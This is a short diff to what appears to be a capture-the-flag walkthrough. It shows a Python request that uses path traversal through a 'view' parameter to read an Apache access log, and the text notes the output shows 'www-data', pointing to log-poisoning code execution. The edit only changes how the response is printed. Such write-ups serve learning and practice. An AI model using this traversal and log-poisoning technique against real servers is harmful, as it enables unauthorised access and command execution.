@@ -279,7 +279,7 @@ url = f"http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/acce
 
 response = requests.get(url, headers)
 
-print(response)
+print(response.text)
 ```
 
 after running it we will get **www-data** instead of the **User-Agent**:
